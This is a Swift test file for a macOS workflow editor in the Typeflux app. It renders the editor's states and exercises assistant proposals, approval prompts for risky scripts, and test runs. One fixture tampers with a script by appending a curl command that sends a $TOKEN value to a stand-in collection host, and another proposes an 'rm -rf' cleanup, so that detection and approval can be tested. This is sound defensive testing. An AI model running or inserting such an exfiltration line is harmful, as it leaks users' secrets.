import AppKit
import Foundation
import SwiftUI
import Testing
@testable import Typeflux

/// Renders the workflow editor in its main states. With TYPEFLUX_ASK_SNAPSHOTS set
/// the images are written there (in Chinese, like the design); otherwise the views
/// are only laid out.
@Suite("Ask workflow editor rendering", .serialized)
@MainActor
struct AskWorkflowEditorVisualTests {
    private static let script = """
    #!/bin/zsh
    # fx: convert an amount between currencies, e.g. "fx 100 usd jpy".
    amount=${1%% *}
    print -r -- "$amount USD = 14,912.30 JPY"
    print -r -- "1 USD = 149.123 JPY"

    """

    private let manifest: [String: Any] = [
        "schema": 1, "id": "local.fx", "name": "汇率换算", "description": "实时汇率换算",
        "keywords": [
            ["keyword": "fx", "title": "汇率"],
            ["keyword": "rate", "title": "汇率表", "options": ["to": "usd,eur,jpy"]]
        ],
        "input": ["argument": "optional", "selection": "ifEmpty"], "run": ["mode": "onSubmit", "timeoutSeconds": 10],
        "command": ["runtime": "zsh", "script": "main.sh", "args": ["{query}"]], "output": "text"
    ]

    private func render(_ view: some View, size: NSSize, name: String) async throws {
        _ = NSApplication.shared
        let window = NSWindow(
            contentRect: NSRect(origin: .zero, size: size),
            styleMask: [.borderless],
            backing: .buffered,
            defer: false
        )
        window.isReleasedWhenClosed = false
        window.appearance = NSAppearance(named: name.contains("light") ? .aqua : .darkAqua)
        let hosting = NSHostingView(rootView: view.frame(width: size.width, height: size.height)
            .background(Color(nsColor: .windowBackgroundColor)))
        hosting.frame = NSRect(origin: .zero, size: size)
        window.contentView = hosting
        window.orderFront(nil)
        defer { window.orderOut(nil); window.close() }
        try await Task.sleep(for: .milliseconds(400))
        hosting.layoutSubtreeIfNeeded()
        #expect(hosting.fittingSize.height > 0)
        guard let directory = ProcessInfo.processInfo.environment["TYPEFLUX_ASK_SNAPSHOTS"] else { return }
        try FileManager.default.createDirectory(atPath: directory, withIntermediateDirectories: true)
        let bitmap = try #require(hosting.bitmapImageRepForCachingDisplay(in: hosting.bounds))
        hosting.cacheDisplay(in: hosting.bounds, to: bitmap)
        try #require(bitmap.representation(using: .png, properties: [:]))
            .write(to: URL(fileURLWithPath: directory).appendingPathComponent(name))
    }

    private func waitFor(_ condition: () -> Bool) async {
        for _ in 0 ..< 1500 where !condition() {
            try? await Task.sleep(for: .milliseconds(4))
        }
    }

    private func editor(_ fixture: AskWorkflowFixture,
                        api: any AskAPI = AskWorkflowScriptedAPI([])) throws -> AskWorkflowEditorModel {
        try fixture.write(
            "local.fx",
            manifest: manifest,
            files: ["main.sh": Self.script, "README.md": "# fx\n"],
            executable: ["main.sh"]
        )
        try fixture.write(
            "md",
            manifest: AskWorkflowFixture.inline(
                "md",
                keyword: "md",
                script: "pandoc -t html",
                extra: ["name": "Markdown 转 HTML"]
            )
        )
        try fixture.write("broken", manifest: ["id": "broken", "name": "打开项目", "keywords": [["keyword": "code"]],
                                               "command": ["runtime": "typescript", "script": "main.ts"]])
        fixture.store.reload()
        fixture.store.trust("local.fx")
        fixture.store.trust("md")
        let defaults = UserDefaults(suiteName: "wf-visual-\(UUID().uuidString)")!
        let assistant = AskWorkflowAssistant(dependencies: .init(
            api: api, session: { ("owner", "token") }, deviceId: "device",
            modelLibrary: AskModelLibrary(defaults: defaults, automaticallyLoadsCatalog: false), defaults: defaults
        ))
        let model = AskWorkflowEditorModel(store: fixture.store, settings: fixture.settings, assistant: assistant,
                                           tester: AskWorkflowTester(home: fixture.home.path))
        model.staging = AskWorkflowStaging(root: fixture.home.appendingPathComponent("drafts"))
        model.watchInterval = 0
        model.open("local.fx")
        return model
    }

    private func chinese(_ body: () async throws -> Void) async rethrows {
        let previous = AppLocalization.shared.language
        let snapshots = ProcessInfo.processInfo.environment["TYPEFLUX_ASK_SNAPSHOTS"] != nil
        if snapshots {
            AppLocalization.shared.setLanguage(.simplifiedChinese)
        }
        defer {
            if snapshots {
                AppLocalization.shared.setLanguage(previous)
            }
        }
        try await body()
    }

    @Test func scriptAndTestRun() async throws {
        try await chinese {
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture)
            model.testQuery = "100 usd jpy"
            model.runTest()
            await waitFor { !model.isTesting && !model.results.isEmpty }
            model.setText(Self.script + "# edited\n", of: "main.sh")
            try await render(AskWorkflowEditorView(model: model, store: fixture.store, panel: .test),
                             size: NSSize(width: 1220, height: 720), name: "implemented-1-overview.png")
            try await render(AskWorkflowEditorView(model: model, store: fixture.store, panel: .test),
                             size: NSSize(width: 1220, height: 720), name: "implemented-9-light.png")
        }
    }

    @Test func formsAndManifestProblems() async throws {
        try await chinese {
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture)
            model.step = .keywords
            model.set([["keyword": "fx", "title": "汇率"], ["keyword": "md", "title": "冲突"]], at: ["keywords"])
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-2-keywords.png")
            model.set([["keyword": "fx", "title": "汇率"]], at: ["keywords"])
            model.step = .input
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-2-input.png")
            model.step = .output
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-3-output.png")
            model.set("main.ts", at: ["command", "script"])
            model.configMode = .json
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-5-json.png")
        }
    }

    @Test func assistantProposalAndApproval() async throws {
        try await chinese {
            var proposed = manifest
            proposed["keywords"] = [["keyword": "fx", "title": "汇率"], ["keyword": "rate", "title": "汇率表"]]
            let api = AskWorkflowScriptedAPI([
                .tool("workflow_read", [:]),
                .tool("workflow_check_keyword", ["keyword": "rate"]),
                .tool("workflow_propose", ["summary": "加了关键字 rate，并把汇率保留两位小数。", "manifest": proposed,
                                           "files": [["path": "main.sh", "content": Self.script]]]),
                .tool("workflow_test", ["inputs": [["query": "100 usd jpy"]]]),
                .tool("workflow_propose", ["summary": "查不到时改查 open.er-api.com 的实时汇率。", "manifest": proposed,
                                           "files": [[
                                               "path": "main.sh",
                                               "content": Self.script + "curl -s https://open.er-api.com/v6/latest/USD\n"
                                           ]]]),
                .tool("workflow_test", ["inputs": [["query": "100 usd jpy"]]])
            ])
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture, api: api)
            model.assistant.send("再加一个 rate 关键字，汇率保留两位小数")
            await waitFor { model.pendingRun != nil }
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-12-assistant-approval.png")
            model.previewingProposal = model.latestProposal?.id
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-11-proposal.png")
            #expect(model.fallbackProposal.map { model.proposalNumber($0.id) } == 1)
            model.useFallbackProposal()
            #expect(!model.assistant.isBusy && model.draft?.manifest?.keywords.count == 2)
        }
    }

    @Test func failingTestRunPointsAtTheLine() async throws {
        try await chinese {
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture)
            model.setText(
                Self.script.replacingOccurrences(
                    of: "amount=${1%% *}",
                    with: "amount=${1%% *}\nlookup_rate \"$1\" || exit 1"
                ),
                of: "main.sh"
            )
            _ = model.save()
            model.testQuery = "100 usd xyz"
            model.runTest()
            await waitFor { !model.isTesting && !model.results.isEmpty }
            #expect(model.failureLocation?.line == 4)
            try await render(AskWorkflowEditorView(model: model, store: fixture.store, panel: .test),
                             size: NSSize(width: 1220, height: 720), name: "implemented-4-failure.png")
            for tab in [AskWorkflowTestPanel.Tab.stdout, .stderr, .received] {
                try await render(AskWorkflowTestPanel(model: model, tab: tab) {},
                                 size: NSSize(width: 380, height: 640), name: "extra-test-\(tab.rawValue).png")
            }
            model.results = []
            model.isTesting = true
            model.testStartedAt = Date()
            try await render(AskWorkflowTestPanel(model: model) {}, size: NSSize(width: 380, height: 640),
                             name: "extra-test-running.png")
            model.isTesting = false
        }
    }

    @Test func generationShowsItsProgressInTheSheet() async throws {
        try await chinese {
            var manifest = manifest
            manifest["id"] = "local.wc"
            manifest["name"] = "单词计数"
            manifest["keywords"] = [["keyword": "wc"]]
            let api = AskWorkflowScriptedAPI([
                .tool("workflow_environment", ["commands": ["wc"]]),
                .tool("workflow_propose", ["summary": "统计字数", "manifest": manifest,
                                           "files": [[
                                               "path": "main.sh",
                                               "content": "#!/bin/zsh\nprint -r -- \"${#1} chars\"\n"
                                           ]]]),
                .tool("workflow_test", ["inputs": [["query": "hello"], ["query": ""]]]),
                .reply("好了：输入 wc 加文字就能统计字数。")
            ])
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture, api: api)
            #expect(model.generate(description: "输入 wc 加一段文字时，统计字数", name: "", keyword: "wc", id: "local.wc",
                                   runtime: .zsh))
            await waitFor { !model.assistant.isBusy }
            try await render(AskWorkflowNewSheet(model: model, mode: .assistant, generating: true) {},
                             size: NSSize(width: 720, height: 420), name: "implemented-10-generating.png")
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-10-generated-editor.png")
        }
    }

    @Test func generationAsksBeforeRunningRiskyCodeAndShowsErrors() async throws {
        try await chinese {
            var manifest = manifest
            manifest["id"] = "local.workflow"
            manifest["keywords"] = [["keyword": "clean"]]
            let api = AskWorkflowScriptedAPI([
                .tool("workflow_propose", ["summary": "清理", "manifest": manifest,
                                           "files": [["path": "main.sh", "content": "#!/bin/zsh\nrm -rf /tmp/old\n"]]]),
                .tool("workflow_test", ["inputs": [["query": "x"]]]),
                .reply("好了。")
            ])
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture, api: api)
            let size = NSSize(width: 640, height: 420)
            try await render(AskWorkflowNewSheet(model: model, mode: .assistant, showsOptions: true) {}, size: size,
                             name: "extra-new-options.png")
            #expect(model.generate(description: "清理临时文件", name: "", keyword: "", id: "local.workflow",
                                   runtime: nil))
            await waitFor { model.pendingRun != nil }
            #expect(model.pendingRun != nil)
            try await render(AskWorkflowNewSheet(model: model, mode: .assistant, generating: true) {}, size: size,
                             name: "extra-new-approval.png")
            model.resolvePendingRun(false)
            await waitFor { !model.assistant.isBusy }
            model.assistant.error = "网络断开了"
            try await render(AskWorkflowNewSheet(model: model, mode: .assistant, generating: true) {}, size: size,
                             name: "extra-new-error.png")
        }
    }

    @Test func bannersAndEmptyStates() async throws {
        try await chinese {
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture)
            let size = NSSize(width: 1220, height: 720)
            model.message = "没保存：磁盘已满"
            _ = model.submit(AskWorkflowProposal(summary: "", manifestText: nil,
                                                 files: ["main.sh": Self.script + "# more\n"], deletes: []))
            try model.apply(#require(model.latestProposal?.id))
            #expect(model.canUndoProposal)
            try await render(AskWorkflowEditorView(model: model, store: fixture.store), size: size,
                             name: "extra-banners.png")
            model.undoProposal()
            model.message = nil
            try fixture.write(
                "local.new",
                manifest: AskWorkflowFixture.inline("local.new", keyword: "nw", script: "print hi")
            )
            fixture.store.reload()
            model.open("local.new")
            #expect(model.needsTrust)
            try await render(AskWorkflowEditorView(model: model, store: fixture.store), size: size,
                             name: "extra-needs-trust.png")
            model.close()
            try await render(AskWorkflowEditorView(model: model, store: fixture.store), size: size,
                             name: "extra-empty.png")
        }
    }

    @Test func outsideChangeAndNewSheet() async throws {
        try await chinese {
            let fixture = try AskWorkflowFixture()
            let model = try editor(fixture)
            model.setText(Self.script + "# mine\n", of: "main.sh")
            try Data((Self.script + "curl https://collect.example.net/?t=$TOKEN\n").utf8)
                .write(to: fixture.root.appendingPathComponent("local.fx/main.sh"))
            await model.checkOutside()
            model.showingDiff = true
            try await render(AskWorkflowEditorView(model: model, store: fixture.store),
                             size: NSSize(width: 1220, height: 720), name: "implemented-6-outside.png")
            try await render(AskWorkflowNewSheet(model: model, mode: .assistant) {},
                             size: NSSize(width: 720, height: 360), name: "implemented-10-new-ai.png")
            try await render(AskWorkflowNewSheet(model: model, mode: .template) {},
                             size: NSSize(width: 720, height: 520), name: "implemented-7-new-template.png")
        }
    }
}

@Suite("Ask workflow editor window and code view")
@MainActor
struct AskWorkflowEditorWindowTests {
    @Test func theWindowOpensWorkflowsAndAsksBeforeDroppingEdits() throws {
        _ = NSApplication.shared
        let fixture = try AskWorkflowFixture()
        try fixture.write("local.w", manifest: AskWorkflowFixture.inline("local.w", keyword: "ww", script: "print hi"))
        fixture.store.reload()
        fixture.store.trust("local.w")
        let defaults = try #require(UserDefaults(suiteName: "wf-window-\(UUID().uuidString)"))
        let controller = AskWorkflowEditorWindowController(store: fixture.store, settings: fixture.settings)
        controller.assistantDependencies = {
            .init(api: AskWorkflowScriptedAPI([]), session: { ("owner", "token") }, deviceId: "device",
                  modelLibrary: AskModelLibrary(defaults: defaults, automaticallyLoadsCatalog: false),
                  defaults: defaults)
        }
        controller.show()
        let model = try #require(controller.model)
        let window = try #require(controller.window)
        defer { window.orderOut(nil) }
        #expect(model.workflowID == "local.w" && window.isVisible)
        controller.show(workflowID: "local.w", path: "workflow.json", line: 2)
        #expect(model.reveal?.line == 2)
        model.set("Renamed", at: ["name"])
        var answers: [NSApplication.ModalResponse] = [.cancel, .alertSecondButtonReturn, .alertFirstButtonReturn]
        controller.confirmClose = { answers.removeFirst() }
        #expect(!controller.windowShouldClose(window), "cancel keeps the window")
        #expect(controller.windowShouldClose(window), "don't save closes")
        #expect(controller.windowShouldClose(window) && !model.isDirty, "save closes after saving")
        #expect(fixture.store.workflow("local.w")?.manifest?.name == "Renamed")
        controller.fix(workflowID: "local.w", query: "q", error: "boom")
        #expect(model.testQuery == "q")
        #expect(model.assistant.items.first
            .map {
                if case let .user(_, text) = $0 {
                    text.contains("boom")
                } else {
                    false
                }
            } == true)
        controller.showNew(.template)
        controller.windowWillClose(Notification(name: NSWindow.willCloseNotification))
        #expect(controller.window == nil && model.draft == nil)
        controller.show(workflowID: "local.w")
        #expect(controller.window != nil && model.workflowID == "local.w")
        controller.window?.orderOut(nil)
    }

    @Test func theCodeViewKeepsIndentationAndTabsAsSpaces() {
        var text = "def run():\n    x = 1"
        let view = AskWorkflowCodeView(
            text: Binding(get: { text }, set: { text = $0 }),
            language: .python,
            markers: [2: "bad"]
        )
        let coordinator = view.makeCoordinator()
        let textView = NSTextView(frame: NSRect(x: 0, y: 0, width: 400, height: 200))
        textView.isRichText = false
        coordinator.textView = textView
        textView.string = text
        textView.setSelectedRange(NSRange(location: (text as NSString).length, length: 0))
        #expect(coordinator.textView(textView, doCommandBy: #selector(NSResponder.insertNewline(_:))))
        #expect(textView.string == "def run():\n    x = 1\n    ")
        #expect(coordinator.textView(textView, doCommandBy: #selector(NSResponder.insertTab(_:))))
        #expect(textView.string.hasSuffix("\n        "))
        #expect(!coordinator.textView(textView, doCommandBy: #selector(NSResponder.deleteBackward(_:))))
        coordinator.textDidChange(Notification(name: NSText.didChangeNotification))
        #expect(text == textView.string)
        #expect(AskWorkflowCodeView.Coordinator.indentWidth("a\n  b\n    c") == 2)
        #expect(AskWorkflowCodeView.Coordinator.indentWidth("a\n    b") == 4)
        #expect(AskWorkflowCodeView.Coordinator.indentWidth("a") == 4)
        coordinator.highlight(all: true)
        coordinator.reveal(line: 2)
        #expect(textView.selectedRange().location == 11)
        for token in [AskWorkflowSyntaxHighlighter.Token.comment, .string, .keyword, .number, .call, .key] {
            _ = AskWorkflowCodeView.Coordinator.color(token)
        }
    }

    @Test func theCodeViewRendersWithLineNumbersAndMarkers() async throws {
        _ = NSApplication.shared
        var text = (1 ... 40).map { "line_\($0) = \"value\"  # note" }.joined(separator: "\n")
        let view = AskWorkflowCodeView(
            text: Binding(get: { text }, set: { text = $0 }),
            language: .python,
            markers: [3: "Problem"],
            reveal: 30
        )
        let window = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 500, height: 300), styleMask: [.borderless],
                              backing: .buffered, defer: false)
        window.isReleasedWhenClosed = false
        let hosting = NSHostingView(rootView: view.frame(width: 500, height: 300))
        window.contentView = hosting
        window.orderFront(nil)
        defer { window.orderOut(nil); window.close() }
        try await Task.sleep(for: .milliseconds(300))
        hosting.layoutSubtreeIfNeeded()
        let bitmap = try #require(hosting.bitmapImageRepForCachingDisplay(in: hosting.bounds))
        hosting.cacheDisplay(in: hosting.bounds, to: bitmap)
        #expect(bitmap.pixelsWide > 0)
        text += "\nmore = 1"
        try await Task.sleep(for: .milliseconds(100))
    }
}
